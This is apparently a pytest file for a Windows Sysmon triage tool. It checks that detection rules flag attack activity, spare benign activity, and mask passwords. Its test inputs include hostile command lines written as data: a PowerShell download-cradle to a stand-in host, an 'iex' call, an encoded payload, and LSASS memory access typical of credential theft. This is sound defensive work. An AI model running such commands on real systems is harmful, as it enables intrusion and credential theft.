"""The checks and the verdict: benign activity stays Benign, attack activity is caught."""

from tests.fixtures.events import attack_events, benign_events, event
from triage.checks import edit_distance, make_verdict, run_checks
from triage import parse
from triage.parse import event_from_xml


def checks_fired(events):
    return {f["check"] for f in run_checks(events)}


# ---------- false positives: normal activity must not be flagged ----------

def test_benign_activity_has_no_findings():
    findings = run_checks(benign_events())
    assert findings == []
    assert make_verdict(findings)["label"] == "Benign"


def test_person_typing_whoami_and_ipconfig_is_not_a_recon_burst():
    # benign_events() has whoami + ipconfig in a cmd window opened from explorer.exe
    assert "recon_burst" not in checks_fired(benign_events())


def test_edge_run_key_and_onedrive_are_known_good():
    assert "persistence" not in checks_fired(benign_events())
    assert "run_from_user_folder" not in checks_fired(benign_events())


# ---------- the attack is caught ----------

def test_attack_is_malicious_with_the_expected_findings():
    findings = run_checks(attack_events())
    fired = {f["check"] for f in findings}
    assert {"persistence", "recon_burst", "lookalike_domain", "suspicious_powershell",
            "document_app_spawns_program", "masquerading", "ransom_note",
            "run_from_user_folder", "network_from_user_folder"} <= fired
    assert make_verdict(findings)["label"] == "Malicious"


def test_every_finding_points_to_real_events():
    events = attack_events()
    ids = {e["record_id"] for e in events}
    for f in run_checks(events):
        assert f["event_ids"], f
        assert set(f["event_ids"]) <= ids


def test_service_from_dropped_file_is_strong_but_program_files_service_is_not():
    events = attack_events() + [
        event(300, 11, "2026-01-05 12:00:00.000", Image="C:\\x\\installer.exe",
              TargetFilename="C:\\Program Files\\Vendor\\agent.exe"),
        event(301, 13, "2026-01-05 12:00:01.000", Image="C:\\Windows\\system32\\services.exe",
              TargetObject="HKLM\\System\\CurrentControlSet\\Services\\VendorAgent\\ImagePath",
              Details='"C:\\Program Files\\Vendor\\agent.exe"'),
    ]
    services = [f for f in run_checks(events) if f["title"] == "New service from a dropped file"]
    assert len(services) == 1
    assert "Fake Updater" in services[0]["detail"]


def test_lookalike_domain_from_browser_is_weak():
    events = [event(1, 22, "2026-01-05 09:00:00.000", Image="C:\\Program Files\\Google\\Chrome\\chrome.exe",
                    QueryName="gmailc.om")]
    findings = run_checks(events)
    assert findings[0]["strength"] == "Weak"
    assert make_verdict(findings)["label"] == "Suspicious"


def test_lookalike_becomes_strong_when_malware_looks_it_up_after_a_browser():
    # The browser lookup comes first (Weak), then a program in a user folder looks up the same name.
    events = [event(1, 22, "2026-01-05 09:00:00.000", Image="C:\\Program Files\\Google\\Chrome\\chrome.exe",
                    QueryName="gmailc.om"),
              event(2, 22, "2026-01-05 09:05:00.000", Image="C:\\Users\\analyst\\AppData\\Local\\Temp\\x.exe",
                    QueryName="gmailc.om")]
    lookalike = [f for f in run_checks(events) if f["check"] == "lookalike_domain"]
    assert len(lookalike) == 1
    assert lookalike[0]["strength"] == "Strong"
    assert lookalike[0]["process"].endswith("x.exe") and "browser" not in lookalike[0]["detail"]
    assert lookalike[0]["time"] == "2026-01-05 09:00:00.000"  # still starts at the first lookup
    assert lookalike[0]["event_ids"] == [1, 2]


def test_passwords_are_hidden():
    hide = parse.hide_secrets
    assert hide(r"net use \\pc02\c$ Secret1 /user:lab\admin") == r"net use \\pc02\c$ **** /user:lab\admin"
    assert hide(r"net use z: \\pc02\share Secret1") == r"net use z: \\pc02\share ****"
    assert hide(r"net use \\pc02\c$ /user:lab\admin") == r"net use \\pc02\c$ /user:lab\admin"  # no password
    assert hide("psexec \\\\pc02 -u admin -p Secret1 cmd") == "psexec \\\\pc02 -u admin -p **** cmd"
    assert hide("tool.exe /p:Secret1 /x") == "tool.exe /p:**** /x"
    assert hide("tool.exe --password=Secret1") == "tool.exe --password=****"
    assert hide("New-Thing -Password 'Secret 1' -Force") == "New-Thing -Password **** -Force"
    assert hide('schtasks /create /tn T /ru admin /rp "Secret 1"') == "schtasks /create /tn T /ru admin /rp ****"
    assert hide("Server=db01;Database=x;Pwd=Secret1;") == "Server=db01;Database=x;Pwd=****;"
    # Normal command lines are left alone.
    for text in ["powershell.exe -enc SQBFAFgA", "C:\\Program Files\\App\\app.exe /S", "whoami /priv",
                 "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",  # -p without a value
                 "C:\\Users\\analyst\\AppData\\Local\\Temp\\FireEye.exe -foobar"]:
        assert hide(text) == text


def test_passwords_are_hidden_when_events_are_read():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>7</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="CommandLine">net use \\\\pc02\\c$ Secret1 /user:admin</Data>'
           '<Data Name="ParentCommandLine">cmd.exe /c psexec -p Secret1</Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert "Secret1" not in str(parsed)
    assert parsed["CommandLine"] == "net use \\\\pc02\\c$ **** /user:admin"


def test_one_damaged_record_does_not_stop_the_file(monkeypatch):
    good_xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
                '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
                '<TimeCreated SystemTime="2026-01-05 09:00:0{n}.000000+00:00"/><EventRecordID>{n}</EventRecordID>'
                '<Computer>LAB-PC01</Computer></System><EventData>'
                '<Data Name="UtcTime">2026-01-05 09:00:0{n}.000</Data><Data Name="Image">C:\\a.exe</Data>'
                '</EventData></Event>')

    class Record:
        def __init__(self, n):
            self.n = n

        def xml(self):
            if self.n == 2:
                raise ValueError("python-evtx could not decode this record")
            return good_xml.format(n=self.n)

    class FakeEvtx:  # stands in for Evtx.Evtx.Evtx: a "with" block that lists records
        def __init__(self, path):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def records(self):
            return [Record(1), Record(2), Record(3)]

    monkeypatch.setattr(parse.evtx, "Evtx", FakeEvtx)
    assert [e["record_id"] for e in parse.read_evtx("any.evtx")] == [1, 3]


def test_lsass_access_from_unknown_program_is_strong():
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage="C:\\Users\\a\\Downloads\\tool.exe",
                    TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1010"),
              event(2, 10, "2026-01-05 09:00:01.000", SourceImage="C:\\Windows\\system32\\svchost.exe",
                    TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1000")]
    findings = run_checks(events)
    assert [f["check"] for f in findings] == ["lsass_access"]
    assert findings[0]["event_ids"] == [1]


def test_office_spawning_powershell():
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{x}", ParentProcessGuid="{w}",
                    Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    CommandLine="powershell -nop")]
    assert "document_app_spawns_program" in checks_fired(events)


# ---------- fewer false "Malicious" verdicts ----------

LSASS = "C:\\Windows\\system32\\lsass.exe"


def test_lsass_access_without_memory_read_is_not_reported():
    # 0x1000 = basic information only (Task Manager does this); no right to read memory.
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage="C:\\Windows\\System32\\Taskmgr.exe",
                    TargetImage=LSASS, GrantedAccess="0x1000")]
    assert run_checks(events) == []


def test_lsass_trusted_name_in_a_user_folder_is_strong():
    fake = "C:\\Users\\bob\\AppData\\Roaming\\MsMpEng.exe"
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=fake, TargetImage=LSASS,
                    GrantedAccess="0x1fffff")]
    findings = run_checks(events)
    assert [f["strength"] for f in findings] == ["Strong"]


def test_lsass_real_defender_and_unknown_access():
    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"
    old_defender = "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=defender, TargetImage=LSASS,
                    GrantedAccess="0x1fffff"),
              event(2, 10, "2026-01-05 09:00:01.000", SourceImage=old_defender, TargetImage=LSASS,
                    GrantedAccess="0x1fffff"),
              # A missing access value still counts: unknown access to LSASS is worth a look.
              event(3, 10, "2026-01-05 09:00:02.000", SourceImage="C:\\Users\\a\\tool.exe", TargetImage=LSASS)]
    findings = run_checks(events)
    assert [f["event_ids"] for f in findings] == [[3]]


def test_lookalike_compares_only_the_main_name():
    agent = "C:\\Program Files\\Agent\\agent.exe"
    normal = [event(n, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName=name)
              for n, name in enumerate(["cloud.google.com", "apply.workday.com", "offices.example.com"], start=1)]
    assert run_checks(normal) == []
    fake = [event(9, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName="fireeyee.com")]
    assert [f["strength"] for f in run_checks(fake)] == ["Strong"]


def test_discord_run_key_is_known_good():
    discord = "C:\\Users\\analyst\\AppData\\Local\\Discord\\app-1.0.9\\Discord.exe"
    events = [event(1, 13, "2026-01-05 09:00:00.000", Image=discord,
                    TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Discord",
                    Details='"C:\\Users\\analyst\\AppData\\Local\\Discord\\Update.exe" --processStart Discord.exe')]
    assert "persistence" not in checks_fired(events)


def test_hidden_powershell_alone_is_not_suspicious():
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    hidden = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{x}", Image=ps,
                    CommandLine="powershell.exe -NoProfile -WindowStyle Hidden -File "
                                "C:\\Program Files\\Agent\\inventory.ps1")]
    assert run_checks(hidden) == []
    bad_commands = ["powershell -enc " + "A" * 60,
                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/a')",
                    "powershell -c iex $code"]
    for number, command in enumerate(bad_commands, start=2):
        bad = [event(number, 1, "2026-01-05 09:00:00.000", ProcessGuid=f"{{y{number}}}", Image=ps,
                     CommandLine=command)]
        assert [f["strength"] for f in run_checks(bad)] == ["Strong"], command


def test_ransom_words_in_a_program_file_are_not_a_note():
    python = "C:\\Python314\\python.exe"
    events = [event(1, 11, "2026-01-05 09:00:00.000", Image=python,
                    TargetFilename="C:\\Python314\\Lib\\site-packages\\Crypto\\decrypt_test.py")]
    assert "ransom_note" not in checks_fired(events)


# ---------- verdict and helpers ----------

def test_enrichment_can_raise_suspicious_to_malicious():
    weak_only = [{"strength": "Weak", "title": "x"}]
    assert make_verdict(weak_only)["label"] == "Suspicious"
    assert make_verdict(weak_only, ["malicious"])["label"] == "Malicious"


def test_edit_distance():
    assert edit_distance("fireeyee", "fireeye") == 1
    assert edit_distance("gmailc", "gmail") == 1
    assert edit_distance("google", "google") == 0


def test_event_from_xml_reads_fields_and_skips_other_providers():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>42</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="UtcTime">2026-01-05 09:00:00.120</Data><Data Name="Image">C:\\a.exe</Data>'
           '<Data Name="CommandLine"></Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert parsed == {"record_id": 42, "event_id": 1, "computer": "LAB-PC01",
                      "time": "2026-01-05 09:00:00.120", "UtcTime": "2026-01-05 09:00:00.120",
                      "Image": "C:\\a.exe", "CommandLine": ""}
    assert event_from_xml(xml.replace("Microsoft-Windows-Sysmon", "Microsoft-Windows-Security-Auditing")) is None
